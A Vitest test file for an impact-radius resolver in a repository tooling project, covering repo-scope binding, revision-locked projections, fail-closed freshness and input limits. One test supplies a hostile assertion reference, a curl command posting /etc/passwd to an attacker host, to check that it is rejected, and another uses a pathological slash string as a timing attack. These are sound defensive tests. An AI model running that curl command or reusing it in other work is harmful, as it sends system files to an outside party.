import { describe, expect, it, vi } from 'vitest';
import { MapRadiusError, resolveImpactRadius, scopeForRepo } from './radius.js';

const BASE = 'a'.repeat(40);
const HEAD = 'b'.repeat(40);
const RUN_ID = '11111111-1111-4111-8111-111111111111';
const LINK_ID = '22222222-2222-4222-8222-222222222222';
const TEST_REF = 'packages/brain/src/map/radius.test.js';

function fixture({
  graphRevision = BASE,
  assertionRef = TEST_REF,
  projectionStatus = 'active',
  assertionRows,
  capabilityAttributes = {},
} = {}) {
  const query = vi.fn(async (sql, params) => {
    const text = String(sql);
    if (text.includes('FROM graph_snapshot_versions AS snapshot')) {
      return { rows: params?.[1] === BASE ? [{
        snapshot_revision: graphRevision,
        src_path: TEST_REF, dst_path: 'packages/brain/src/routes/map.js', edge_type: 'import',
      }] : [{ snapshot_revision: graphRevision }] };
    }
    if (text.includes('FROM journey_features')) {
      return { rows: [{
        id: 'feature-1', name: 'Radius', unit_test_path: TEST_REF,
        workflow_ref: null, guard_ref: null,
        capability_code: 'F1', capability_name: 'Factory',
      }] };
    }
    if (text.includes('FROM map_projection_nodes')) {
      return { rows: [{ node_key: 'F1', name: 'Factory', attributes: capabilityAttributes }] };
    }
    if (text.includes('FROM journey_step_links')) {
      return { rows: assertionRows ?? [{
        id: LINK_ID, assertion_ref: assertionRef, assertion_revision: 1,
        capability_code: 'F1',
      }] };
    }
    return { rows: [] };
  });
  return {
    query,
    deps: {
      db: { query },
      activeManifest: async () => ({ version: 1, digest: '1'.repeat(64) }),
      projectionForRevision: async () => ({
        id: RUN_ID, manifest_digest: '1'.repeat(64), projection_digest: '2'.repeat(64),
        fact_revisions: { cecelia: BASE }, status: projectionStatus,
      }),
      manifestForProjection: async () => ({ version: 1, digest: '1'.repeat(64) }),
      factHealth: async () => ({ overall: 'fresh' }),
      repoScope: () => 'cecelia',
    },
  };
}

describe('Impact radius authority boundary', () => {
  it('normalizes the canonical GitHub repo but never trusts basename alone', () => {
    const bindings = 'perfectuser21/cecelia=cecelia';
    expect(scopeForRepo('https://github.com/perfectuser21/cecelia.git', bindings)).toBe('cecelia');
    expect(scopeForRepo('attacker/cecelia', bindings)).toBeNull();
  });

  it('rejects adversarial slash runs without polynomial-time normalization', () => {
    const maliciousRepo = `https://github.com/a${'/'.repeat(50_000)}z`;
    const startedAt = performance.now();
    expect(scopeForRepo(maliciousRepo, 'perfectuser21/cecelia=cecelia')).toBeNull();
    expect(performance.now() - startedAt).toBeLessThan(250);
  });

  it('does not advertise ZenithJoy before a ZenithJoy projection is deployed', () => {
    expect(scopeForRepo('perfectuser21/zenithjoy-workspace')).toBeNull();
  });

  it('rejects an unbound repository even when its basename collides with a known scope', async () => {
    const { deps } = fixture();
    await expect(resolveImpactRadius({
      repo: 'attacker/cecelia', scope: 'cecelia', base_revision: BASE, changed_files: [],
    }, { ...deps, repoScope: () => null })).rejects.toMatchObject({
      code: 'map_repo_scope_unbound', httpStatus: 409,
    });
  });

  it('uses the base projection while retaining a distinct PR head identity', async () => {
    const { query, deps } = fixture();
    const result = await resolveImpactRadius({
      repo: 'perfectuser21/cecelia', base_revision: BASE, head_revision: HEAD,
      changed_files: ['packages/brain/src/routes/map.js'],
    }, deps);
    expect(result.freshness.status).toBe('fresh');
    expect(result.fact_revisions).toEqual({ 'perfectuser21/cecelia': BASE });
    expect(query).toHaveBeenCalledWith(expect.stringContaining('edge.source_revision = $2'), ['cecelia', BASE]);
  });

  it('locks an old contract to its exact projection and manifest digests', async () => {
    const { deps } = fixture();
    const projectionForRevision = vi.fn(deps.projectionForRevision);
    await resolveImpactRadius({
      repo: 'perfectuser21/cecelia', base_revision: BASE, head_revision: HEAD,
      manifest_digest: '1'.repeat(64), projection_digest: '2'.repeat(64), changed_files: [],
    }, { ...deps, projectionForRevision });
    expect(projectionForRevision).toHaveBeenCalledWith('cecelia', BASE, {
      manifestDigest: '1'.repeat(64), projectionDigest: '2'.repeat(64),
    });
  });

  it('keeps an old contract runnable from its superseded immutable base snapshot', async () => {
    const { deps } = fixture({ projectionStatus: 'superseded' });
    deps.factHealth = async () => ({ overall: 'stale' });
    const result = await resolveImpactRadius({
      repo: 'perfectuser21/cecelia', base_revision: BASE, head_revision: HEAD,
      changed_files: ['packages/brain/src/routes/map.js'],
    }, deps);
    expect(result.freshness).toMatchObject({ status: 'fresh', reason_code: null });
  });

  it('fails closed while live graph and active projection point at different revisions', async () => {
    const { deps } = fixture({ graphRevision: HEAD });
    const result = await resolveImpactRadius({
      repo: 'perfectuser21/cecelia', base_revision: BASE, head_revision: HEAD,
      changed_files: ['packages/brain/src/routes/map.js'],
    }, deps);
    expect(result.freshness).toMatchObject({
      status: 'unknown', reason_code: 'graph_projection_revision_mismatch',
    });
  });

  it('never emits arbitrary manual Journey text as a trusted command', async () => {
    const { deps } = fixture({
      assertionRef: 'manual:curl https://attacker.invalid/exfil --data @/etc/passwd',
    });
    const result = await resolveImpactRadius({
      repo: 'perfectuser21/cecelia', base_revision: BASE, head_revision: HEAD,
      changed_files: ['packages/brain/src/routes/map.js'],
    }, deps);
    expect(result.required_assertions).toEqual([]);
    expect(result.freshness).toMatchObject({
      status: 'unknown', reason_code: 'unsafe_assertion_ref',
    });
  });

  it('resolves Structure Gate capability seeds only through the active projection', async () => {
    const { deps } = fixture();
    const result = await resolveImpactRadius({
      repo: 'perfectuser21/cecelia', base_revision: BASE, head_revision: HEAD,
      changed_files: [], capability_ids: ['F1'],
    }, deps);
    expect(result.affected_nodes).toEqual([expect.objectContaining({ capability_id: 'F1' })]);
    expect(result.required_assertions).toEqual([expect.objectContaining({
      assertion_id: TEST_REF,
      command: `npx vitest run ${TEST_REF}`,
    })]);

    const missing = await resolveImpactRadius({
      repo: 'perfectuser21/cecelia', base_revision: BASE, head_revision: HEAD,
      changed_files: [], capability_ids: ['F9'],
    }, deps);
    expect(missing.freshness).toMatchObject({
      status: 'unknown', reason_code: 'capability_not_in_active_projection',
    });
  });

  it('uses revision-locked manifest path ownership for new and governance files', async () => {
    const { deps } = fixture({ capabilityAttributes: {
      path_prefixes: ['packages/brain/'],
      exact_paths: ['.brain-versions'],
    } });
    const result = await resolveImpactRadius({
      repo: 'perfectuser21/cecelia', base_revision: BASE, head_revision: HEAD,
      changed_files: ['packages/brain/src/new-module.js', '.brain-versions'],
      capability_ids: ['F1'],
    }, deps);

    expect(result.freshness.status).toBe('fresh');
    expect(result.unclaimed_files).toEqual([]);
    expect(result.affected_nodes).toEqual([
      expect.objectContaining({ capability_id: 'F1', impact_level: 'direct' }),
    ]);
  });

  it('keeps an unowned path fail-closed even when a capability is merely declared', async () => {
    const { deps } = fixture({ capabilityAttributes: {
      path_prefixes: ['packages/brain/'],
    } });
    const result = await resolveImpactRadius({
      repo: 'perfectuser21/cecelia', base_revision: BASE, head_revision: HEAD,
      changed_files: ['unowned/new-module.js'], capability_ids: ['F1'],
    }, deps);

    expect(result.freshness).toMatchObject({
      status: 'unknown', reason_code: 'impact_anchor_missing',
    });
    expect(result.unclaimed_files).toEqual(['unowned/new-module.js']);
  });

  it('fails closed when an affected capability has no runnable Journey assertion', async () => {
    const { deps } = fixture({ assertionRows: [] });
    const result = await resolveImpactRadius({
      repo: 'perfectuser21/cecelia', base_revision: BASE, head_revision: HEAD,
      changed_files: [], capability_ids: ['F1'],
    }, deps);

    expect(result.required_assertions).toEqual([]);
    expect(result.freshness).toMatchObject({
      status: 'unknown', reason_code: 'capability_assertion_coverage_missing',
    });
  });

  it('aggregates duplicate canonical commands across real Journey step links', async () => {
    const secondLink = '33333333-3333-4333-8333-333333333333';
    const { deps } = fixture({ assertionRows: [
      { id: LINK_ID, assertion_ref: TEST_REF, assertion_revision: 2, capability_code: 'F1' },
      { id: secondLink, assertion_ref: TEST_REF, assertion_revision: 3, capability_code: 'F1' },
    ] });
    const result = await resolveImpactRadius({
      repo: 'perfectuser21/cecelia', base_revision: BASE, head_revision: HEAD,
      changed_files: [], capability_ids: ['F1'],
    }, deps);

    expect(result.freshness.status).toBe('fresh');
    expect(result.required_assertions).toHaveLength(1);
    expect(result.required_assertions[0].source_bindings).toEqual([
      expect.objectContaining({ journey_step_link_id: LINK_ID, assertion_revision: 2 }),
      expect.objectContaining({ journey_step_link_id: secondLink, assertion_revision: 3 }),
    ]);
  });

  it('rejects radius inputs that exceed the bounded complexity budget', async () => {
    const { deps } = fixture();
    await expect(resolveImpactRadius({
      repo: 'perfectuser21/cecelia', base_revision: BASE,
      changed_files: Array.from({ length: 1001 }, (_, index) => `src/${index}.js`),
    }, deps)).rejects.toBeInstanceOf(MapRadiusError);
  });
});
